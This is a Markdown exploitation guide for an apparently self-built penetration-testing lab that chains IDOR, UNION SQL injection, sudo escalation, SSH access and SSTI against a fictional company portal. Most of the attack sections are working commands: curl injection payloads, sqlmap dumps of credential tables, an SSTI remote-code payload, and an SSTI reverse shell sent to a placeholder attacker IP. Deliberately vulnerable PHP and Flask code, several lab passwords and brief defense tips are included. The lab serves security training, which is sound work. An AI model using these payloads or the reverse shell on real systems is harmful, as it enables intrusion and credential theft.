# IDOR Lab - Complete Exploitation Guide

## Overview
This lab contains multiple vulnerabilities designed for penetration testing practice. The primary attack chain demonstrates real-world vulnerability chaining.

## Attack Chain
```
1. IDOR (Client-Side Access Control) → Access other users' data
2. UNION-based SQL Injection → Extract dev credentials
3. Gitea Access → Find additional secrets
4. Web Shell → Gain initial foothold
5. Privilege Escalation → www-data → developer
6. SSH Access → Persistent access
7. SSTI Exploitation → Root access
```

---

## Vulnerability 1: Insecure Direct Object Reference (IDOR)

### Description
The portal uses client-side JavaScript to check if the `uid` parameter matches the logged-in user. This can be easily bypassed.

### Exploitation Steps

1. **Login** as Peter Schneider:
   - URL: `http://portal.mbti.local/login.php`
   - Credentials: `peter.schneider@mbti.local` / `tekelomuxo`

2. **Notice the URL pattern**:
   ```
   http://portal.mbti.local/dashboard?uid=MBTI2024837
   http://portal.mbti.local/profile?uid=MBTI2024837
   http://portal.mbti.local/teams?uid=MBTI2024837
   ```

3. **Bypass client-side check**:
   - Intercept the request in Burp Suite
   - Or disable JavaScript in browser
   - Or modify localStorage: `localStorage.setItem('user', JSON.stringify({employee_id: 'MBTI2024999'}))`

4. **Access other users' data**:
   ```
   http://portal.mbti.local/profile?uid=MBTI2024999  (Klaus Weber - CSO)
   http://portal.mbti.local/dashboard?uid=MBTI2024001
   ```

### Impact
- Access to all employee profiles
- View sensitive projects and reports
- Enumerate valid employee IDs

---

## Vulnerability 2: UNION-based SQL Injection

### Description
The search functionality in `/api/search.php` contains a **UNION-based SQL injection** vulnerability that allows direct extraction of data from the `dev_environment` database in a single request.

### The Vulnerable Code
```php
$search = $_GET['q'];  // No sanitization!
$query = "SELECT employee_id, full_name, email, department, role, manager_name 
          FROM employees 
          WHERE CONCAT(employee_id, ' ', full_name, ' ', email, ' ', department) LIKE '%" . $search . "%'";
```

### Exploitation

#### 1. Normal Search (Test the endpoint)
```bash
SESSION=$(curl -s -X POST http://portal.mbti.local/api/auth.php \
  -H "Content-Type: application/json" \
  -d '{"employee_id":"MBTI2024837","password":"tekelomuxo"}' | jq -r '.token')

# Search for employees
curl -H "Cookie: PHPSESSID=$SESSION" \
  "http://portal.mbti.local/api/search.php?q=Peter"
# Returns: {"success":true,"found":true,"count":1,"employees":[...]}
```

#### 2. Extract ALL Credentials with UNION

**Payload**:
```
xxx%' UNION SELECT service_name,username,password,access_level,notes,'dev' FROM dev_environment.dev_credentials#
```

**Full Command**:
```bash
curl -H "Cookie: PHPSESSID=$SESSION" \
  "http://portal.mbti.local/api/search.php?q=xxx%25%27%20UNION%20SELECT%20service_name,username,password,access_level,notes,%27dev%27%20FROM%20dev_environment.dev_credentials%23" \
  | jq '.employees[] | {service: .employee_id, user: .full_name, password: .email}'
```

**Response**:
```json
{
  "service": "Gitea",
  "user": "admin",
  "password": "MBTIGit2024!Admin"
}
{
  "service": "Gitea",
  "user": "developer",
  "password": "DevGit@MBTI2024"
}
{
  "service": "Gitea",
  "user": "peter.schneider",
  "password": "GitAccess!2024"
}
{
  "service": "Jenkins",
  "user": "jenkins-admin",
  "password": "JenkinsMBTI!2024"
}
{
  "service": "MySQL Dev",
  "user": "dev_admin",
  "password": "DevDB@2024MBTI"
}
{
  "service": "Redis",
  "user": "redis-user",
  "password": "RedisDev2024!"
}
```

#### 3. Column Mapping

The UNION must return 6 columns to match the original query:

| Position | Employee Table | Dev Credentials Table |
|----------|---------------|----------------------|
| 1 | employee_id | service_name |
| 2 | full_name | username |
| 3 | email | **password** ⚠️ |
| 4 | department | access_level |
| 5 | role | notes |
| 6 | manager_name | 'dev' (static) |

✅ **Note**: The password appears in the `email` field of the response!

#### 4. Extract Credentials
```bash
# Extract Gitea admin password (MBTIGit2024!Admin)
# Position 1: M
curl -H "Cookie: PHPSESSID=your_session" \
  "http://portal.mbti.local/api/search.php?q=' OR (SELECT SUBSTRING(password,1,1) FROM dev_environment.dev_credentials WHERE username='admin')='M' OR '1'='2"

# Position 2: B
curl -H "Cookie: PHPSESSID=your_session" \
  "http://portal.mbti.local/api/search.php?q=' OR (SELECT SUBSTRING(password,2,1) FROM dev_environment.dev_credentials WHERE username='admin')='B' OR '1'='2"
```

### Automated Exploitation with SQLMap

```bash
# Get session cookie first
SESSION="your_session_cookie_here"

# Basic exploitation
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=$SESSION" \
  --batch \
  --technique=B \
  --level=5 \
  --risk=3

# Enumerate databases
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=$SESSION" \
  --dbs

# Dump dev_environment database
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=$SESSION" \
  -D dev_environment \
  --tables

# Extract credentials
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=$SESSION" \
  -D dev_environment \
  -T dev_credentials \
  --dump
```

### Expected SQLi Output
```
dev_credentials table:
+----+--------------+------------------+-------------------+---------------+
| id | service_name | username         | password          | access_level  |
+----+--------------+------------------+-------------------+---------------+
| 1  | Gitea        | admin            | MBTIGit2024!Admin | administrator |
| 2  | Gitea        | developer        | DevGit@MBTI2024   | developer     |
| 3  | Gitea        | peter.schneider  | GitAccess!2024    | developer     |
| 4  | Jenkins      | jenkins-admin    | JenkinsMBTI!2024  | administrator |
| 5  | MySQL Dev    | dev_admin        | DevDB@2024MBTI    | administrator |
| 6  | Redis        | redis-user       | RedisDev2024!     | read-write    |
+----+--------------+------------------+-------------------+---------------+
```

---

## Vulnerability 3: Web Shell Access

### After SQLi - Access Gitea

1. **Access dev.mbti.local** (you'll need to add to /etc/hosts):
   ```bash
   echo "CONTAINER_IP dev.mbti.local" >> /etc/hosts
   ```

2. **Login to Gitea**:
   - URL: `http://dev.mbti.local:3000`
   - Credentials: `admin` / `MBTIGit2024!Admin`

3. **Find secrets in repositories** (future step - repositories contain additional secrets)

---

## Vulnerability 4: Privilege Escalation (www-data → developer)

### Initial Access
After gaining web shell (via file upload or other means), you'll be running as `www-data`.

### Check Sudo Permissions
```bash
sudo -l
```

Output:
```
User www-data may run the following commands:
    (developer) NOPASSWD: /usr/local/bin/log_rotation.py
    (developer) NOPASSWD: /usr/local/bin/system_monitor.py
    (developer) NOPASSWD: /usr/local/bin/manage_containers.py
```

### Escalate to Developer
```bash
# Run as developer user
sudo -u developer /bin/bash
```

### Developer User Secrets
Once as developer, check the environment:
```bash
cat ~/.bashrc
```

Output:
```bash
export DEV_USER=developer
export DEV_PASS=cDjv8kFq67C1D1Yuhn8
export INTERNAL_DASHBOARD_PORT=5000
```

---

## Vulnerability 5: SSH Access

### From Developer Shell
```bash
# SSH credentials leaked in environment
ssh developer@localhost -p 2222
# Password: cDjv8kFq67C1D1Yuhn8
```

### SSH from External
```bash
# From Kali machine
ssh developer@CONTAINER_IP -p 2222
# Password: cDjv8kFq67C1D1Yuhn8
```

**Note**: Peter Schneider's SSH password authentication is disabled, only developer can SSH.

---

## Vulnerability 6: Server-Side Template Injection (SSTI)

### Discovery
The developer user runs an internal Flask dashboard on port 5000 (localhost only).

### Access via SSH Tunnel
```bash
# Create SSH tunnel from Kali
ssh -L 5000:127.0.0.1:5000 developer@CONTAINER_IP -p 2222

# Access dashboard
curl http://localhost:5000
```

### SSTI Exploitation

The dashboard has an SSTI vulnerability in template rendering:

```python
# Vulnerable code in /home/developer/internal_app/app.py
template_string = f"<h1>Welcome {user_input}</h1>"  # Unsafe!
```

#### Test for SSTI
```bash
curl http://localhost:5000/?name={{7*7}}
# If vulnerable, output contains: 49
```

#### Exploit SSTI for RCE
```bash
# Read /etc/passwd
curl 'http://localhost:5000/?name={{"".__class__.__mro__[1].__subclasses__()[396]("cat /etc/passwd",shell=True,stdout=-1).communicate()}}'

# Get reverse shell
curl 'http://localhost:5000/?name={{"".__class__.__mro__[1].__subclasses__()[396]("bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"",shell=True)}}'
```

---

## Vulnerability 7: Root Access

Since the Flask app runs as the `developer` user and has specific permissions, you can:

1. **Find SUID binaries**:
   ```bash
   find / -perm -4000 2>/dev/null
   ```

2. **Check for kernel exploits**:
   ```bash
   uname -a
   searchsploit ubuntu 22.04
   ```

3. **Leverage Docker breakout** (if applicable):
   ```bash
   # Check if running in privileged container
   cat /proc/self/status | grep CapEff
   ```

---

## Defense Recommendations

### 1. IDOR Prevention
- Implement server-side access control
- Use session-based authorization
- Never trust client-side checks
- Implement proper authentication middleware

### 2. SQL Injection Prevention
```php
// Use prepared statements
$stmt = $conn->prepare("SELECT COUNT(*) FROM credentials WHERE service_name LIKE ?");
$search_param = "%$search%";
$stmt->bind_param("s", $search_param);
```

### 3. Privilege Escalation Prevention
- Remove unnecessary sudo permissions
- Don't store credentials in environment variables
- Use proper secret management (HashiCorp Vault, AWS Secrets Manager)
- Disable SSH password authentication

### 4. SSTI Prevention
```python
# Use safe template rendering
from jinja2 import Template
template = Template("Welcome {{ name }}")
output = template.render(name=user_input)  # Auto-escapes
```

---

## Lab Credentials Summary

| Service | Username | Password | Purpose |
|---------|----------|----------|---------|
| Portal | peter.schneider@mbti.local | tekelomuxo | IDOR victim account |
| Gitea | admin | MBTIGit2024!Admin | From SQLi |
| Gitea | developer | DevGit@MBTI2024 | From SQLi |
| SSH | developer | cDjv8kFq67C1D1Yuhn8 | From env leak |
| MySQL | mbti_admin | Training_DB_2024 | Database access |

---

## Tools Required

- Burp Suite (IDOR testing)
- SQLMap (Blind SQLi automation)
- curl/wget (Manual testing)
- SSH client (Persistent access)
- Python (SSTI exploit development)

---

## Learning Objectives

1. ✅ Understand client-side vs server-side security controls
2. ✅ Practice blind SQL injection techniques
3. ✅ Learn privilege escalation methods
4. ✅ Exploit SSTI vulnerabilities
5. ✅ Chain multiple vulnerabilities for full compromise
6. ✅ Understand defense-in-depth security model

---

## Notes

- The **PDF upload feature** on Reports page is a **rabbit hole** - it's secure and meant to teach about false positives
- The search functionality filtering is client-side only; the SQLi endpoint still exists for exploitation
- The `dev_environment` database is separate from `mbti_employees` to limit blast radius

---

## Testing & Verification

**Status**: ✅ **OPERATIONAL** (as of 2025-12-03)

### Quick Test

```bash
# 1. Login and get session token
SESSION=$(curl -s -X POST http://portal.mbti.local/api/auth.php \
  -H "Content-Type: application/json" \
  -d '{"employee_id":"MBTI2024837","password":"tekelomuxo"}' | jq -r '.token')

# 2. Test normal search (should find results)
curl -H "Cookie: PHPSESSID=$SESSION" \
  "http://portal.mbti.local/api/search.php?q=Gitea"
# Expected: {"success":true,"found":true,"message":"Results found"}

# 3. Test non-existent search (should not find results)
curl -H "Cookie: PHPSESSID=$SESSION" \
  "http://portal.mbti.local/api/search.php?q=NonExistentService123"
# Expected: {"success":true,"found":false,"message":"No results found"}
```

### Troubleshooting

If you see **500 Internal Server Error**:

```bash
# Check if dev_environment database exists
docker exec mbti_db mysql -uroot -p'MB_R00t_P@ss_2024!' \
  -e "SHOW DATABASES;" | grep dev_environment

# If missing, manually create it
cat mysql/dev_db.sql | docker exec -i mbti_db \
  mysql -uroot -p'MB_R00t_P@ss_2024!'

# Grant permissions
docker exec mbti_db mysql -uroot -p'MB_R00t_P@ss_2024!' \
  -e "GRANT ALL PRIVILEGES ON dev_environment.* TO 'mbti_admin'@'%'; FLUSH PRIVILEGES;"
```

**Root Cause**: The dev_environment database is only created on *first* container initialization. If containers are rebuilt without removing volumes, the init scripts don't re-run.

---

## Support

For issues or questions about this lab:
1. Check container logs: `docker logs mbti_portal`
2. Check PHP errors: `docker exec mbti_portal tail -f /var/log/apache2/portal_error.log`
3. Verify database: `docker exec mbti_db mysql -u mbti_admin -pTraining_DB_2024 -e "USE dev_environment; SELECT * FROM dev_credentials;"`
